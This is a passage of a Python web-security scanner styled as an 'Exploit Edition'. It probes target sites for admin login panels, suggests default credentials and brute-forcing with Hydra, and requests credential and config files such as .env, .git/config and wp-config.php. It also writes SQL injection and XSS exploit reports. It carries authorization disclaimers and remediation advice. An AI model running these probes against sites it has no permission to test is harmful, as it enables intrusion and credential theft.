        admin_paths = [
            "/admin", "/administrator", "/wp-admin", "/wp-login.php",
            "/login", "/dashboard", "/controlpanel", "/cpanel",
            "/webadmin", "/backend", "/system", "/manager"
        ]
        
        found_panels = []
        
        for path in admin_paths:
            test_url = urljoin(self.target_url, path)
            try:
                response = requests.get(test_url, timeout=3, verify=False)
                if response.status_code < 400:
                    found_panels.append({
                        "path": path,
                        "url": test_url,
                        "status": response.status_code
                    })
                    print(f"  {Fore.GREEN}[✓] Found admin panel: {path}{Style.RESET_ALL}")
            except:
                pass
        
        output = f"Admin Panel Finder Results for {self.target_url}:\n\n"
        
        if found_panels:
            output += f"🚨 {Fore.RED}FOUND {len(found_panels)} ADMIN PANELS:{Style.RESET_ALL}\n\n"
            for panel in found_panels:
                output += f"🔐 {Fore.YELLOW}{panel['path']}{Style.RESET_ALL}\n"
                output += f"   URL: {panel['url']}\n"
                output += f"   Status: {panel['status']}\n\n"
            
            output += f"🔧 {Fore.YELLOW}Exploit Suggestions:{Style.RESET_ALL}\n"
            output += "1. Try default credentials (admin/admin, admin/password, etc.)\n"
            output += "2. Use brute force tools like Hydra or Patator\n"
            output += "3. Check for authentication bypass vulnerabilities\n"
            
            status = "critical"
        else:
            output += f"{Fore.GREEN}✅ No admin panels found{Style.RESET_ALL}\n"
            status = "success"
        
        return ToolResult("Admin Panel Finder", status, output, {
            "found_panels": found_panels
        })
    
    def sensitive_file_discovery(self):
        """Look for sensitive files"""
        sensitive_files = [
            ".env", ".git/config", ".htpasswd", ".htaccess",
            "config.php", "database.sql", "backup.zip",
            "wp-config.php", "settings.py", "config.json"
        ]
        
        found_files = []
        
        for file in sensitive_files:
            test_url = urljoin(self.target_url, file)
            try:
                response = requests.get(test_url, timeout=3, verify=False)
                if response.status_code == 200 and len(response.content) > 0:
                    found_files.append({
                        "file": file,
                        "url": test_url,
                        "size": len(response.content)
                    })
            except:
                pass
        
        output = f"Sensitive File Discovery for {self.target_url}:\n"
        if found_files:
            output += f"⚠ Found {len(found_files)} potentially sensitive files:\n"
            for item in found_files:
                output += f"  • {item['file']} ({item['size']} bytes)\n"
            
            output += f"\n🔧 {Fore.RED}CRITICAL: These files can leak credentials and configuration!{Style.RESET_ALL}\n"
            status = "critical"
        else:
            output += "No sensitive files found\n"
            status = "success"
        
        return ToolResult("Sensitive File Discovery", status, output, {
            "found_files": found_files
        })
    
    # ============================================================================
    # REPORT GENERATION
    # ============================================================================
    
    def create_results_directory(self):
        """Create directory for scan results"""
        clean_domain = re.sub(r'[^\w\-]', '_', self.target_domain)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        base_dir = "scan_results"
        
        if not os.path.exists(base_dir):
            os.makedirs(base_dir)
        
        results_dir = os.path.join(base_dir, f"{clean_domain}_{timestamp}")
        os.makedirs(results_dir)
        
        return results_dir
    
    def save_tool_result(self, results_dir, tool_name, result):
        """Save individual tool results"""
        clean_tool_name = re.sub(r'[^\w\-]', '_', tool_name.lower())
        
        # Save as JSON
        json_file = os.path.join(results_dir, f"{clean_tool_name}.json")
        result_dict = {
            "tool": result.tool_name,
            "status": result.status,
            "timestamp": result.timestamp,
            "output": result.output,
            "details": result.details
        }
        
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(result_dict, f, indent=2, ensure_ascii=False)
    
    def generate_summary_report(self, results_dir, failed_tools):
        """Generate comprehensive summary report"""
        summary_file = os.path.join(results_dir, "SUMMARY.md")
        
        with open(summary_file, 'w', encoding='utf-8') as f:
            f.write("# Security Scan Summary Report\n\n")
            
            f.write(f"**Scan ID**: {self.scan_id}\n")
            f.write(f"**Target URL**: {self.target_url}\n")
            f.write(f"**Domain**: {self.target_domain}\n")
            if self.target_ip:
                f.write(f"**IP Address**: {self.target_ip}\n")
            f.write(f"**Scan Date**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            # Executive Summary
            f.write("## Executive Summary\n\n")
            
            total_tools = len(self.available_tools)
            successful = len([r for r in self.results.values() if r.status == "success"])
            warnings = len([r for r in self.results.values() if r.status == "warning"])
            critical = len([r for r in self.results.values() if r.status == "critical"])
            errors = len([r for r in self.results.values() if r.status == "error"])
            
            f.write(f"- **Total Tools Executed**: {total_tools}\n")
            f.write(f"- **Successful Scans**: {successful}\n")
            f.write(f"- **Warnings Found**: {warnings}\n")
            f.write(f"- **Critical Findings**: {critical}\n")
            f.write(f"- **Errors**: {errors}\n")
            
            # Recommendations
            f.write("\n## Security Recommendations\n\n")
            
            recommendations = [
                "1. **Immediate Actions**:",
                "   - Change all default credentials",
                "   - Remove sensitive files from public access",
                "   - Close unnecessary ports",
                "   - Update all software to latest versions",
                "",
                "2. **Short-term Actions (1-2 weeks)**:",
                "   - Implement Web Application Firewall (WAF)",
                "   - Enable security headers (CSP, HSTS, etc.)",
                "   - Configure proper access controls",
                "   - Set up logging and monitoring",
            ]
            
            for rec in recommendations:
                f.write(f"{rec}\n")
            
            f.write("\n## Detailed Results\n\n")
            f.write("All tool results are saved in individual files in this directory.\n")
        
        print(f"\n{Fore.GREEN}[✓] Summary report saved: {summary_file}{Style.RESET_ALL}")
        return summary_file
    
    def generate_exploit_report(self, results_dir):
        """Generate detailed exploit report"""
        print(f"\n{Fore.CYAN}[*] Generating exploit report...{Style.RESET_ALL}")
        
        exploit_file = os.path.join(results_dir, "EXPLOITS.md")
        
        with open(exploit_file, 'w', encoding='utf-8') as f:
            f.write("# Exploit Report - Proof of Concept\n\n")
            f.write(f"**Target**: {self.target_url}\n")
            f.write(f"**Generated**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"**Disclaimer**: For educational and authorized testing only\n\n")
            
            f.write("## 📋 Table of Contents\n")
            f.write("- [SQL Injection Exploits](#sql-injection-exploits)\n")
            f.write("- [XSS Exploits](#xss-exploits)\n")
            f.write("- [Useful Tools](#useful-tools)\n")
            f.write("- [Legal Disclaimer](#legal-disclaimer)\n\n")
            
            # SQL Injection Exploits
            f.write("## 🔓 SQL Injection Exploits\n\n")
            
            sql_exploits = {k:v for k,v in self.exploit_results.items() if 'SQLi' in k}
            if sql_exploits:
                for param, exploits in sql_exploits.items():
                    f.write(f"### Parameter: `{param.replace('SQLi_', '')}`\n\n")
                    
                    f.write("#### Basic Payloads:\n")
                    for exploit in exploits.get("basic", [])[:5]:
                        f.write(f"- **{exploit['description']}**\n")
                        f.write(f"  ```\n  {exploit['url']}\n  ```\n\n")
                    
                    f.write("#### Automated Tools:\n")
                    for cmd in exploits.get("commands", []):
                        f.write(f"- **{cmd['tool']}**\n")
                        f.write(f"  ```bash\n  {cmd['command']}\n  ```\n\n")
            else:
                f.write("No SQL Injection vulnerabilities detected.\n\n")
            
            # XSS Exploits
            f.write("## 🎯 XSS Exploits\n\n")
            
            xss_exploits = {k:v for k,v in self.exploit_results.items() if 'XSS' in k}
            if xss_exploits:
                for param, exploits in xss_exploits.items():
                    f.write(f"### Parameter: `{param.replace('XSS_', '')}`\n\n")
                    
                    f.write("#### Basic Payloads:\n")
                    for exploit in exploits.get("basic", [])[:5]:
                        f.write(f"- **{exploit['description']}**\n")
                        f.write(f"  ```\n  {exploit['url']}\n  ```\n\n")
            else:
                f.write("No XSS vulnerabilities detected.\n\n")
            
            # Legal Disclaimer
            f.write("## ⚖️ Legal Disclaimer\n\n")
            f.write("**IMPORTANT**: This report is for educational purposes only.\n\n")
            f.write("### Rules of Engagement:\n")
            f.write("1. **Authorization**: Only test systems you own or have explicit written permission to test\n")
            f.write("2. **Scope**: Stay within the authorized testing boundaries\n")
            f.write("3. **Documentation**: Keep detailed logs of all testing activities\n")
            f.write("4. **Disclosure**: Follow responsible disclosure procedures\n")
            f.write("5. **Compliance**: Adhere to all applicable laws and regulations\n")
        
        print(f"{Fore.GREEN}[✓] Exploit report saved: {exploit_file}{Style.RESET_ALL}")
        return exploit_file
    
    def print_final_summary(self, results_dir, failed_tools):
        """Print final scan summary"""
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}SCAN COMPLETED{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        
        # Calculate statistics
        total_tools = len(self.available_tools)
        successful = len([r for r in self.results.values() if r.status == "success"])
        warnings = len([r for r in self.results.values() if r.status == "warning"])
        critical = len([r for r in self.results.values() if r.status == "critical"])
        errors = len([r for r in self.results.values() if r.status == "error"])
        
        print(f"\n📊 {Fore.CYAN}SCAN STATISTICS:{Style.RESET_ALL}")
        print(f"   Target: {Fore.WHITE}{self.target_url}{Style.RESET_ALL}")
        print(f"   Tools Executed: {Fore.WHITE}{total_tools}{Style.RESET_ALL}")
        print(f"   ✅ Successful: {Fore.GREEN}{successful}{Style.RESET_ALL}")
        print(f"   ⚠️  Warnings: {Fore.YELLOW}{warnings}{Style.RESET_ALL}")
        print(f"   🚨 Critical: {Fore.RED}{critical}{Style.RESET_ALL}")
        print(f"   ❌ Errors: {Fore.RED}{errors}{Style.RESET_ALL}")
        
        # Display exploit summary
        if self.exploit_results:
            print(f"\n🔧 {Fore.YELLOW}EXPLOITS GENERATED:{Style.RESET_ALL}")
            for category in self.exploit_results.keys():
                print(f"   • {category}")
        
        print(f"\n📁 {Fore.CYAN}RESULTS SAVED IN:{Style.RESET_ALL}")
        print(f"   {results_dir}")
        
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    
    def run(self):
        """Main execution method"""
        try:
            self.print_banner()
            self.get_target()
            self.select_tools()
            
            print(f"\n{Fore.YELLOW}[!] Starting scan in 3 seconds...{Style.RESET_ALL}")
            time.sleep(3)
            
            # Run scans with dashboard
            results_dir, summary_file, exploit_file, failed_tools = self.run_scans_with_dashboard()
            
            # Final summary
            self.print_final_summary(results_dir, failed_tools)
            
            print(f"\n{Fore.GREEN}[✓] Thank you for using EG-Tool Pro++ Exploit Edition!{Style.RESET_ALL}")
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
            sys.exit(0)
        except Exception as e:
            print(f"{Fore.RED}[✗] Unexpected error: {e}{Style.RESET_ALL}")
            import traceback
            traceback.print_exc()
            sys.exit(1)

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main entry point"""
    # Check requirements
    try:
        import requests
        import colorama
    except ImportError:
        print(f"{Fore.RED}[✗] Required libraries not installed{Style.RESET_ALL}")
        print("Install using: pip install requests colorama")
        sys.exit(1)
    
    # Run scanner
    scanner = SecurityScanner()
    scanner.run()

if __name__ == "__main__":
    main()
